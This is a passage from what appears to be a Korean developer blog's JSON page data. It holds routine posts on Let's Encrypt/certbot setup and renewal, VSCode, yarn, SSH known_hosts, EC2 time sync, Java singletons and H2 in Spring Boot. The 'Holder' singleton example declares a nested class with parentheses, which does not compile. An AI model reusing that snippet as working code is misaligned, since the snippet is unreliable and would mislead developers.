/User/YourHome/Library/Caches/typescript/YourVersion/node_modules/@types/....\n\n이상해서 저기를 열었다가 지워도 똑같이 생성되고 계속 참조했다.  \n그래서 이곳저곳 찾다가...  \n아주 간단하게 해결하였다.\n\n<br>\n\n## Solution\n\n1. VSCode의 환경설정을 들어가서 (Mac 기준 : Command + ,) 검색창에 아래의 키워드 검색\n2. **disableAutomaticTypeAcquisition** 이거 항목이 체크가 안되어 있을건데 체크해준다.\n3. 라이브러리 참조 영역을 삭제하고 VSCode 재시작 해본다.\n\n![](/img01.png)\n\n<br>\n\n### 참고\n\n- [스택오버플로우 유사 질문](https://stackoverflow.com/questions/48480676/why-vscode-is-importing-packages-from-typescript-cache)\n- [해답](https://blog.actorsfit.in/a?ID=01700-fdba4144-d6f0-41bd-a475-59f7cc21ca68)\n\n```toc\n\n```\n"},{"excerpt":"22.09.25 내용 추가 여기서 진행한 방식의 경우 standalone 방식이다. 이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다. 최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다. Webroot도 사용하지만 와일드카드(ex: *.a…","fields":{"slug":"/letsencrypt/211105_letscert-fail/"},"frontmatter":{"date":"November 05, 2021","title":"Let'sEncrypt 갱신이 불가할 때 (produced an unexpected error The manual plugin is not working)","description":null,"tags":["LetsEncrypt","Troubleshooting","Infra"],"series":"LetsEncrypt","previewImage":"letsencrypt_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.jpg)\n\n# 22.09.25 내용 추가\n\n여기서 진행한 방식의 경우 **standalone** 방식이다.  \n이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다.\n\n최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다.  \nWebroot도 사용하지만 와일드카드(ex: \\*.api.com 등) 인증이 불가하기 때문에 DNS 인증을 사용할 것을 추천한다.  \nDNS 인증 방식이 필요한 경우 아래 포스팅을 참고하자.\n\n[LetsEncrypt 적용법 (DNS 인증 & AWS)](https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt)\n\n<br>\n\n## Let'sEncrypt 갱신이 불가능??\n\nLet'sEncrypt를 적용하고 나서 갱신 테스트를 해보는데 이상한 에러를 마주했다.\n\n```\nAttempting to renew cert (dev.net) from /your/letsencrypt/path/renewal/dev.net.conf produced an unexpected error: The manual plugin is not working; there may be problems with your existing configuration.\n\nThe error was: PluginError('An authentication script must be provided with --manual-auth-hook when using the manual plugin non-interactively.'). Skipping.\nAll renewal attempts failed. The following certs could not be renewed:\n  /your/letsencrypt/path/live/dev.net/fullchain.pem (failure)\n```\n\n아 뭐가 이렇게 안되지? 라고 삽질했었으나...  \n이것저것 찾아본 결과 아래의 문제가 원인이었다\n\n> 원인은 갱신을 auto 모드가 아닌 manual 모드로 진행한 문제\n\n원인을 제공했던 명령어는 다음과 같다\n\n```\nsudo certbot certonly --manual --preferred-challenges=dns --email test@test.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos --debug --no-bootstrap -d dev.net\n```\n\n**메뉴얼 모드로 만든 인증서는 자동으로 갱신이 불가능하다.**  \n그래서 난...다시 오토 모드로 새로 만들었다...\n\n이 문제를 겪으신 분은 다시 오토 모드로 빠르게 시작하는걸...추천한다..\n난 어떻게 해보려다가 1시간 말아먹었다...\n\n- [참고 블로그](https://darkstart.tistory.com/109?category=871909)\n\n```toc\n\n```\n"},{"excerpt":"22.09.25 내용 추가 여기서 진행한 방식의 경우 standalone 방식이다. 이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다. 최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다. Webroot도 사용하지만 와일드카드(ex: *.a…","fields":{"slug":"/letsencrypt/211105_renew-certbot/"},"frontmatter":{"date":"November 05, 2021","title":"Let'sEncrypt 자동 갱신 처리하기","description":null,"tags":["LetsEncrypt","Infra"],"series":"LetsEncrypt","previewImage":"letsencrypt_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.jpg)\n\n# 22.09.25 내용 추가\n\n여기서 진행한 방식의 경우 **standalone** 방식이다.  \n이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다.\n\n최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다.  \nWebroot도 사용하지만 와일드카드(ex: \\*.api.com 등) 인증이 불가하기 때문에 DNS 인증을 사용할 것을 추천한다.  \nDNS 인증 방식이 필요한 경우 아래 포스팅을 참고하자.\n\n[LetsEncrypt 적용법 (DNS 인증 & AWS)](https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt)\n\n<br>\n\n## Let'sEncrypt 유효기간?\n\n> 혹시 아직 Let'sEncrypt를 설치하지 않으신 분이라면 [Let'sEncrypt 설치후 AWS에 적용하기](https://elfinlas.github.io/letsencrypt/211105_letsencrypt-install/) 에 설치법을 참고하시길 바란다\n\nLet'sEncrypt는 무료인 대신에 인증서를 주기적으로 인증해줘야 한다  \n그래서 보통 이것을 크론탭으로 처리해서 편하게 간다.\n\n경각심(?)을 위해 직접 갱신하는 분(?)도 봤지만...자동으로 하는게 정신 건강에 좋다..  \n물론 LetsEncrypt 팀에서 메일을 주기도 한다. (만료 10일전, 당일) 이렇게?\n\n<br>\n\n![](/img_01.png)\n\n<br>\n\n저번에 크론탭으로 해뒀는데 뭔가 잘못 건들여서 실행이 안되어 이번에 다시 셋팅하게 되었고 내용을 정리해서 올려본다.\n\n## Let'sEncrypt Crontab 적용해보기\n\n### 갱신 기간 여부 확인\n\nLetsEncrypt 인증서는 90일 유효하며, 만료 20일 전부터 갱신이 가능하다.  \n갱신이 가능한지 여부는 아래의 명령어를 통해 확인이 가능하다.\n\n```\n> sudo certbot certificates\n```\n\n아래는 커맨드 후 결과 예시이다.\n\n```\nubuntu@:~$ sudo certbot certificates\nSaving debug log to /your/letsencrypt/path/letsencrypt.log\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nFound the following certs:\n  Certificate Name: dev.net\n    Serial Number: 22233344URSerialNumber\n    Key Type: RSA\n    Domains: dev.net\n    Expiry Date: 2123-12-31 00:00:00+00:00 (VALID: 89 days)\n    Certificate Path: /your/letsencrypt/path/fullchain.pem\n    Private Key Path: /your/letsencrypt/path/privkey.pem\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n```\n\n인증 기간이 20일 이하면 가능하다.\n\n### 갱신 여부 확인\n\n먼저 갱신이 제대로 되는지 테스트를 해보려면 아래의 명령어를 수행해본다\n\n```\n> sudo certbot renew --pre-hook \"service nginx stop\" --post-hook \"service nginx start\" --dry-run\n```\n\n미들웨어는 자신이 맞는거를 사용하면 된다. (필자는 nginx)  \n뒤에 --dry-run 이 테스트를 수행하게 해주는 옵션이다.\n\n```\nubuntu@:~$ sudo certbot renew --pre-hook \"service nginx stop\" --post-hook \"service nginx start\" --dry-run\nSaving debug log to /your/letsencrypt/path/letsencrypt.log\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nProcessing /your/letsencrypt/path/renewal/dev.net.conf\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nSimulating renewal of an existing certificate for dev.net\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nCongratulations, all simulated renewals succeeded:\n  /your/letsencrypt/path/live/dev.net/fullchain.pem (success)\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n```\n\n위와 같이 축하한다고 뜨면 인증하는데 문제가 없다는 뜻이다.\n\n> PS : 만약 인증이 안된다고 뜨고 에러에 다음과 같은 구문(produced an unexpected error The manual plugin is not working) 이 있는 경우 [이곳](https://elfinlas.github.io/letsencrypt/211105_renew-certbot)을 참고하자.\n\n<br>\n\n### 갱신 처리 (With crontab)\n\n먼저 크론탭을 열어 작성해주고...\n\n```\n> crontab -e\n```\n\n만약 크론탭이 먼저 선등록 되어 있는지 확인하려면..\n\n```\n> cat /etc/crontab -> 등록된 크론탭 확인\n```\n\n먼저 난 3개월마다 매 1일에 스크립트를 수행하게 해줬다.  \n크론탭 명령어는 아래와 같이 작성했다.\n\n```\n> 1 0 1 1-12/3 * sudo certbot renew --pre-hook \"service nginx stop\" --post-hook \"service nginx start\" >> /mylog/letsencrypt/log/$(date '+%Y%m%d').log\n```\n\n그리고 마지막으로 크론탭을 재시작 해준다.\n\n```\n> sudo service cron restart\n```\n\n그럼 이제 정상적으로 등록이 된 것이다.\n\n```toc\n\n```\n"},{"excerpt":"22.09.25 내용 추가 여기서 진행한 방식의 경우 standalone 방식이다. 이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다. 최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다. Webroot도 사용하지만 와일드카드(ex: *.a…","fields":{"slug":"/letsencrypt/211105_letsencrypt-install/"},"frontmatter":{"date":"November 04, 2021","title":"Let'sEncrypt 설치후 AWS에 적용하기","description":null,"tags":["LetsEncrypt","Aws","Infra"],"series":"LetsEncrypt","previewImage":"letsencrypt_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.jpg)\n\n# 22.09.25 내용 추가\n\n여기서 진행한 방식의 경우 **standalone** 방식이다.  \n이 방식은 80포트를 강제로 내려서 인증 대상이 진짜 사용하는 서비스인지를 체크하기에 매우 비효율적인 방식이다.\n\n최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다.  \nWebroot도 사용하지만 와일드카드(ex: \\*.api.com 등) 인증이 불가하기 때문에 DNS 인증을 사용할 것을 추천한다.  \nDNS 인증 방식이 필요한 경우 아래 포스팅을 참고하자.\n\n[LetsEncrypt 적용법 (DNS 인증 & AWS)](https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt)\n\n<br>\n\n## Let'sEncrypt?\n\n이번에 서비스를 준비하면서 EC2에서 하나씩 올려서 해보기로 했다.\n\n사실 AWS 기반이라 로드벨런서에 인증서 물리면 되는데...  \n전에 해보던게 생각 나기도 했고..\n\n일단 서비스 규모가 더 커지면 그 때 안정적으로 가고 지금은 빌드업 수준으로 해보기로 했다.\n\n일단 뭐 **Let'sEncrypt**에 대한 자세한 것은 이미 알고 있다는 가정 하에 바로 설치법부터 들어간다.\n\n그 전에 환경은..\n\n> AWS 기반 EC2 Ubuntu 20.04 LTS 기준으로 작업을 진행  \n> Nginx 사용 <- 중요하진 않음\n\n<br>\n\n### Part 1 설치 커맨드\n\n아래의 커맨드로 하나씩 진행하였다\n\n```\nsudo apt update\nsudo snap install core; sudo snap refresh core\nsudo apt-get remove certbot\nsudo snap install --classic certbot # 설치\nsudo ln -s /snap/bin/certbot /usr/bin/certbot # 링크\nsudo certbot certonly --email [인증에 사용할 이메일] --standalone -d [적용할 도메인]  실행\n```\n\n커맨드 설명은 아래와 같다\n\n1번 : 설치 전 업데이트 처리  \n2번 : 필요한 것들 설치  \n3번 : 기존에 설치된 certbot이 있다면 제거  \n4번 : certbot 설치  \n5번 : 심볼릭 링크 생성  \n6번 인증서 만드는데 email은 인증에 대한 대표자 메일(필자는 주로 쓰는 메일 사용)을 적고 -d는 적용할 도메인을 적어준다 (elfinlas.io.xx 등)\n\n6번 명령어 이후 아래와 같이 뜨면 정상적으로 된 것이다.\n\n```\nubuntu@ip$ sudo certbot certonly --email test@test.com --standalone -d dev.net\nSaving debug log to /your/some/path/letsencrypt.log\nRequesting a certificate for dev.net\n\nSuccessfully received certificate.\nCertificate is saved at: /your/some/path/letsencrypt/live/dev.net/fullchain.pem\nKey is saved at:         /your/some/path/letsencrypt/live/dev.net/privkey.pem\nThis certificate expires on 9999-99-99. <= 여긴 인증기간은 3개월인가 줘서 사람마다 틀림\nThese files will be updated when the certificate renews.\nCertbot has set up a scheduled task to automatically renew this certificate in the background.\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nIf you like Certbot, please consider supporting our work by:\n * Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n * Donating to EFF:                    https://eff.org/donate-le\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n\n```\n\n> 커맨드에 대해 좀더 설명이 필요한 분은 [이곳](https://certbot.eff.org/lets-encrypt/ubuntufocal-other) 에서 직접 확인해보자\n\n### Part 2 AWS 작업\n\n이렇게 진행하고 나서 AWS 콘솔로 가준다.  \n콘솔에서는 다음과 같은 절차로 진행한다.\n\n1. AWS 콘솔에서 Certificate Manager 이동\n2. 인증서 선택에서 각 항목에 해당 하는 값을 가져온다. (아까 생성한 pem 파일을 사용)\n   1. 인증서 본문 => cert.pem\n   2. 인증서 프라이빗 => privkey.pem\n   3. 인증서 체인 => fullchain.pem\n3. 마무리 하면 ec2에 접속해서 콘솔에서 아랴와 같이 nginx를 재시작 해준다.\n   1. sudo service nginx restart\n\n<br>\n\n아마 다른 블로그에서는 설치법만 나오고 보통 AWS 설명도 약간 부실했는데 직접 찾아보고 적용한 방법이다.\n\n그리고 기반은 nginx 인데 아파치 쓰거나 다른 미들웨어 쓰시는 분들은 똑같이 서비스만 재시작 하면 된다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2021-10-18) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 처음 node를 하려다가... 이번에 진행하는 프로젝트에 노드를 적용해보려고 노드 공부를 시작했다. 노드 환경을 구축하고, npm은 문제가 많아서 페이스북에서 만든 yarn이라는걸 많이 쓰는 추세라 하여..…","fields":{"slug":"/node-js/211018_yarn_usage_error/"},"frontmatter":{"date":"October 18, 2021","title":"yarn 실행 시 \"Usage Error The nearest package directory\" 뜨는 문제","description":null,"tags":["NodeJS","Yarn","Troubleshooting"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2021-10-18) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n## 처음 node를 하려다가...\n\n이번에 진행하는 프로젝트에 노드를 적용해보려고 노드 공부를 시작했다.  \n노드 환경을 구축하고, npm은 문제가 많아서 페이스북에서 만든 yarn이라는걸 많이 쓰는 추세라 하여...  \nyarn을 사용하기로 마음먹고 실행해봤다.\n\n그런데 역시 처음엔 고통과 배움의 시간이 필요하듯...  \n이상한 문제가 나에게 찾아왔다.\n\n![](/img01.png)\n\n프로젝트를 지웠다가 다시 해도 계속 발생하고, 검색을 해도 잘 안나오거나 뭐라고 하는지 이해가 잘 안되었다.  \n지금 생각해보면 너무나도 간단한 문제였지만 -\\_-;;\n\n내가 찾은 솔루션은 이 [문서](https://github.com/yarnpkg/berry/issues/2212) 였다.  \n내용을 요약하면...\n\n<br>\n\n> 너가 지금 하려는 디렉토리의 상위쪽에 package.json 또는 yarn.lock 파일이 존재한다\n> <br>\n\n맨 처음엔 '상위에 저런게 있을리가 없지' 라면서 그냥 넘겼는데..  \n도저히 못찾아서 헤매다가...\n\n<br>\n\n> HEXO\n\n<br>\n\n그렇다.  \n이 블로그는 hexo로 만들어졌고, hexo는 node.js로 만들어졌는데, 이 hexo를 깔면서 홈 디렉토리에 뭔가를 했던 기억이 생각났다...  \n그리고 확인 결과....역시 있었다. (package-lock.json package.json)\n\n그리고 두 파일을 제거하고 yarn 명령어를 사용했더니 잘 된다 -\\_-;\n\n### 결론은 항상 안되면 솔루션의 글을 잘 읽고 확인도 잘 해보자.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2021-10-04) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. iTerm2 에서 경로가 깨저서 나오는 경우  위와 같이 깨질 경우 설정에서 폰트를 바꿔주면 된다. Preferences(command + ,) -> Profiles 탭 -> Text 항목 -> Font를 …","fields":{"slug":"/tools/211004_iterm2_font/"},"frontmatter":{"date":"October 04, 2021","title":"iTerm2에서 경로가 깨져서 나오는경우","description":null,"tags":["Tools"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2021-10-04) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# iTerm2 에서 경로가 깨저서 나오는 경우\n\n![](/img_01.png)\n\n위와 같이 깨질 경우 설정에서 폰트를 바꿔주면 된다.\n\n> Preferences(command + ,) -> Profiles 탭 -> Text 항목 -> Font를 변경\n\n![](/img_02.png)\n\n위와 같이 변경한 경우 깨지는것은 사라진다.\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2021-10-18) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. RSA 키 충돌 문제 (REMOTE HOST IDENTIFICATION HAS CHANGED) 최근 인프라 쪽 작업을 하면서 ec2 에 작업을 좀 하다가 키를 바꾸게 되었다. 그리고 다시 접근을 하는데 아래…","fields":{"slug":"/ubuntu/211003_rsa_key_change/"},"frontmatter":{"date":"October 03, 2021","title":"RSA 키 충돌 (REMOTE HOST IDENTIFICATION HAS CHANGED)","description":null,"tags":["Ubuntu"],"series":"Ubuntu","previewImage":"ubuntu_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2021-10-18) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n# RSA 키 충돌 문제 (REMOTE HOST IDENTIFICATION HAS CHANGED)\n\n최근 인프라 쪽 작업을 하면서 ec2 에 작업을 좀 하다가 키를 바꾸게 되었다.  \n그리고 다시 접근을 하는데 아래와 같은 에러가 발생하였다.\n\n```bash\n\nshell > ssh -i \"test.pem\" 192.168.0.1\n\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that a host key has just been changed.\nThe fingerprint for the ECDSA key sent by the remote host is\nSHA256:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nPlease contact your system administrator.\nAdd correct host key in [자신의 known_hosts 경로] to get rid of this message.\n.....\n```\n\n이럴 경우 다시 키를 생성해서 처리해주면 된다.\n\n> ssh-keygen -R [접근할 주소]\n\n```bash\nshell > ssh-keygen -R [접근할 주소-ec2 주소 등]\n...\n[본인의 known_hosts 경로] updated.\nOriginal contents retained as [본인의 known_hosts 경로]\n...\n```\n\n위와 같은 출력이 뜬 뒤로 다시 해보면 잘 된다.\n\n[참고사이트](https://cpuu.postype.com/post/30065)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2021-10-03) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Aws ec2 ubuntu에서 타임라인 맞추기 두 가지 방법이 있다. 명령어 처리 아래의 명령어를 통해 처리한다 AWS 추천 방법 - Amazon Time Sync Service 구성 처리 참고링크","fields":{"slug":"/ubuntu/211003_aws_ec2_timeline/"},"frontmatter":{"date":"October 03, 2021","title":"aws ec2 ubuntu에서 타임라인 맞추기","description":null,"tags":["Ubuntu","Aws","EC2"],"series":"Ubuntu","previewImage":"ubuntu_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2021-10-03) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n# Aws ec2 ubuntu에서 타임라인 맞추기\n\n두 가지 방법이 있다.\n\n## 명령어 처리\n\n아래의 명령어를 통해 처리한다\n\n```shell\nsudo rm /etc/localtime\nsudo ln -s /usr/share/zoneinfo/Asia/Seoul /etc/localtime\n```\n\n## AWS 추천 방법 - Amazon Time Sync Service 구성 처리\n\n```\n# Step 1 - 아래 커맨드 수행\nsudo apt install chrony\n\n# Step 2 - /etc/chrony/chrony.conf 파일 수정\nvim /etc/chrony/chrony.conf\n\n# Step 3 - 파일에 이미 존재하는 server 또는 pool 문 앞에 다음 라인을 추가하고 변경 사항을 저장\nserver 169.254.169.123 prefer iburst minpoll 4 maxpoll 4\n\n# Step 4 - chrony 서비스 재시작\nsudo /etc/init.d/chrony restart\n\n# Step 5 - 확인\nchronyc sources -v\n```\n\n[참고링크](https://docs.aws.amazon.com/ko_kr/AWSEC2/latest/UserGuide/set-time.html#configure-amazon-time-service-ubuntu)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-09-23) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Java에서 Singleton 패턴이란? Singleton(이하 싱글톤) 패턴은 자바에서 많이 사용한다. 먼저 싱글톤이란 어떤 클래스가 최초 한번만 메모리를 할당하고(Static) 그 메모리에 객체를 만들어…","fields":{"slug":"/java/190923_java-singleton/"},"frontmatter":{"date":"September 23, 2019","title":"Java에서 싱글톤(Singleton) 패턴을 사용하는 이유와 주의할 점","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-09-23) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Java에서 Singleton 패턴이란?\n\nSingleton(이하 싱글톤) 패턴은 자바에서 많이 사용한다.  \n먼저 싱글톤이란 **어떤 클래스가 최초 한번만 메모리를 할당하고(Static) 그 메모리에 객체를 만들어 사용하는 디자인 패턴** 을 의미한다.  \n즉 생성자의 호출이 반복적으로 이뤄져도 실제로 생성되는 객체는 최초 생성된 객체를 반환 해주는 것이다.  \n보통 아래와 같이 사용하게 된다.\n\n```java\npublic class ExampleClass {\n    //Instance\n    private static ExampleClass instance = new ExampleClass();\n\n    //private construct\n    private ExampleClass() {}\n\n    public static ExampleClass getInstance() {\n        return instance;\n    }\n}\n```\n\n위 코드에서는 instance라는 전역 변수를 선언하는데 **static**을 줌으로써 인스턴스화 하지 않고 사용할 수 있게 하였지만 접근 제한자가 **private** 로 되어 있어 직접적인 접근은 불가능하다.  \n또한 생성자도 private으로 되어 있어 **new** 를 통한 객체 생성도 불가능하다.  \n결국 getInstance 메서드를 통해서 해당 인스턴스를 얻을 수 있게 된다.  \n위의 예제는 아주 작은 규모에서 사용할 수 있는 싱글톤 패턴이며, 다음에서 좀 더 알아보기로 한다.\n\n<br>\n\n## 그렇다면 싱글톤 패턴을 사용하는 이유는?\n\n위에서도 언급된 바와 같이 한번의 객체 생성으로 재 사용이 가능하기 때문에 메모리 낭비를 방지할 수 있다.  \n또한 싱글톤으로 생성된 객체는 무조건 한번 생성으로 전역성을 띄기에 다른 객체와 공유가 용이하다.  \n이렇게만 보면 싱글턴이 좋아보일 수 있지만 문제점도 존재한다.\n\n<br>\n\n## 싱글톤의 문제점\n\n싱글톤도 위에서 언급된 것 처럼 전역성을 띄면서 다른 객체와 공통으로 사용하는 경우와 같은 몇 가지 케이스에서만 사용할 때 효율적이며 그 외에는 문제점이 생길 수 있다.\n\n일단 싱글톤으로 만든 객체의 역할이 간단한 것이 아닌 역할이 복잡한 경우라면 해당 싱글톤 객체를 사용하는 **다른 객체간의 결함도**가 높아져서 객체 지향 설계 원칙에 어긋나게 된다. (개방-폐쇄)\n\n또한 해당 싱글톤 객체를 수정할 경우 싱글톤 객체를 사용하는 곳에서 **사이드 이팩트** 발생 확률이 생기게 되며, **멀티 쓰래드**환경에서 동기화 처리 문제등이 생기게 된다.\n\n<br>\n\n## 다양한 싱글톤의 구현\n\n싱글톤을 구현하는 방법은 몇 가지가 있는데 아래와 같이 구현할 수 있다.\n\n### static block\n\n```java\npublic class ExampleClass {\n    //Instance\n    private static ExampleClass instance;\n\n    //private construct\n    private ExampleClass() {}\n\n    static {\n        try { instance = new ExampleClass();}\n        catch(Exception e) { throw new RuntimeException(\"Create instace fail. error msg = \" + e.getMessage() ); }\n    }\n\n    public static ExampleClass getInstance() {\n        return instance;\n    }\n}\n```\n\n위와 같이 static 블럭을 사용힐 경우 클래스가 로딩될 때 한번만 실행을 하게 되는 특성을 사용한다.  \n하지만 인스턴스가 사용되는 시점이 아닌 클래스 로딩 시점에 실행이 된다.\n\n### lazy init\n\n위 static 방법에서 개선하여 클래스 로딩 시점이 아닌 인스턴스가 필요하여 요청할 때 생성되는 형태로 작성하였다.\n\n```java\npublic class ExampleClass {\n    //Instance\n    private static ExampleClass instance;\n\n    //private construct\n    private ExampleClass() {}\n\n    public static ExampleClass getInstance() {\n        if (instance == null) { instance = new ExampleClass();}\n        return instance;\n    }\n}\n```\n\n하지만 위 형태로 구성할 경우 멀티 쓰레드 환경에서 취약하다.\n특정 쓰레드가 동시에 getInstance() 메서드를 호출하게 되면 인스턴스가 두 번 생성되는 문제가 발생한다.\n\n### Thread safe + lazy\n\n```java\npublic class ExampleClass {\n    //Instance\n    private static ExampleClass instance;\n\n    //private construct\n    private ExampleClass() {}\n\n    public static synchronized ExampleClass getInstance() {\n        if (instance == null) { instance = new ExampleClass();}\n        return instance;\n    }\n}\n```\n\nLazy에서 보였던 getInstance() 메서드에 **synchronized** 키워드를 붙임으로써 쓰레드에서 동시 접근에 대한 문제를 해결하였다.  \n하지만 **synchronized** 키워드는 성능 저하를 발생시킨다.\n\n## Holder\n\n```java\npublic class ExampleClass {\n\n    //private construct\n    private ExampleClass() {}\n\n    private static class InnerInstanceClazz() {\n        private static final ExampleClass instance = new ExampleClass();\n    }\n\n    public static ExampleClass getInstance() {\n        return InnerInstanceClazz.instance;\n    }\n}\n```\n\nJVM의 클래스 로더 메커니즘과 클래스의 로드 시점을 이용하여 내부 클래스를 통해 생성 시킴으로써 쓰레드 간의 동기화 문제를 해결한다.  \n위 방법은 현재 java에서 싱글톤 생성에서 사용하는 **대표적인 방법**이다.\n\n<br>\n\n## 정리\n\n싱글톤 패턴은 Spring framework에서도 많이 사용되며, 어떤식으로 구현하는지 알아두면 도움이 된다.\n\n자바와 Spring에서의 싱글톤 차이점이라면, 싱글톤 객체의 생명주기가 다르다.\n\n또한 자바에서 공유 범위는 Class loader 기준이지만, Spring에서는 ApplicationContext가 기준이 된다.\n\n<br>\n\n### 참고\n\n- https://blog.seotory.com/post/2016/03/java-singleton-pattern\n- https://jeong-pro.tistory.com/86\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-06-22) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Spring boot에서 H2 데이터베이스 사용하기 정말 오랜만에 포스팅을 남긴다. 이직 후 블로그를 정리할 시간도 없이 다양한 프로젝트를 진행하였다. 하면서 쌓은 경험들이나 작성할 것들이 Notion에 …","fields":{"slug":"/spring_spring-boot/190622-spring-boot-use-h2/"},"frontmatter":{"date":"June 22, 2019","title":"Spring boot에서 H2 데이터베이스 사용하기","description":null,"tags":["Spring Boot","H2"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-06-22) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_spring.png)\n\n<br>\n\n# Spring boot에서 H2 데이터베이스 사용하기\n\n정말 오랜만에 포스팅을 남긴다.  \n이직 후 블로그를 정리할 시간도 없이 다양한 프로젝트를 진행하였다.  \n하면서 쌓은 경험들이나 작성할 것들이 [Notion](https://www.notion.so)에 산더미처럼 쌓여있다.  \n이제부터 하나씩 정리를 하면서 포스팅을 다시 열심히 해볼 예정이다.  \n각설하고...  \n첫 포스팅은 H2 데이터베이스를 붙여보는 부분이다.\n\n<br>\n\n## H2?\n\nH2는 자바 기반의 RDBMS이다.  \n브라우저 콘솔 지원, 저용량 (2MB), JDBC API 지원 등 다양한 장점을 가지고 있다.  \n이런 장점들 덕에 테스트 DB로 많이 쓰인다.  \n나도 포스팅을 하면서 JPA 등을 테스트 하기 위해 H2를 설정을 하였는데 이번 포스팅에서는 이 H2를 Spring boot에 붙이는 것에 대해 알아보려 한다.  \nH2에 대해 더 알고 싶은 분은 [공식 홈페이지](http://www.h2database.com/html/main.html)를 참고하자.\n\n<br>\n\n## How to install?\n\n> 먼저 진행 환경은 아래와 같다.\n> IntelliJ + Spring boot 2.1.6 + Gradle\n\n처음 프로젝트를 진행한다면 [Spring initializr](https://start.spring.io)를 통해서 손쉽게 추가할 수 있다.\n\n![](/img_01.png)\n\n위 이미지 